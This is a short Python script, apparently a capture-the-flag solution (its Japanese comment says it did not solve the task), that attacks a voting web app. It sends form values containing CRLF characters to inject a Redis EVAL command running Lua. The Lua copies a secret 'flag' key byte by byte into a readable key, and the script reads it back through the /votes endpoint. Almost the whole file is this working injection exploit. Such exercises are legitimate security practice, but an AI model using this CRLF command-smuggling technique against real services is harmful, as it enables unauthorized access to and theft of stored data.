#解けなかった
import httpx

BASE_URL = "http://localhost:3000"
BASE_URL = "http://34.170.146.252:50153"

with httpx.Client(base_url=BASE_URL) as client:
    flag = ""
    for i in range(64):
        lua_code = f"""
local value = redis.call('GETRANGE', 'flag', {i}, {i});
return redis.call('SET', 'dog', tostring(string.byte(value)));
""".replace("\n", " ")
        r1 = client.post(
            "/vote", data={"animal": "\r\nalpaca\r\n" + f"""EVAL "{lua_code}" 0"""}
        )
        flag += chr(client.get("/votes").json()["dog"])
        print(flag)
        if flag.endswith("}"):
            break